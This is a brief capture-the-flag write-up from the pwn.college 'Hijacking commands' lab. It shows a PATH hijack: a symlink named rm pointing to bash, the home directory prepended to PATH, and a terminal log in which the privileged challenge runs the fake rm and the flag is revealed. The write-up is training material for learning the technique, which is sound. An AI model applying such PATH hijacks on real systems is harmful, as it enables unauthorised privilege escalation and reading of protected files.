# Hijacking commands

## Procedure
i started the challenge pwn.college
as per the question.
then i typed `ln -s /usr/bin/bash ./rm` to create a symbolic link.
after that i appended  /home/hacker directory into path using `PATH=/home/hacker/:$PATH`.
then i pasted my flag to the website.

## Code
`hacker@path~hijacking-commands:~$ ln -s /usr/bin/bash ./rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker/:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker//rm. Executing!
/flag: line 1: pwn.college{kni0C3u52lGK4ImmKSgJJF5MqU-.ddzNyUDL5EjN0czW}: command not found`

## References
AI and lot of errors and time
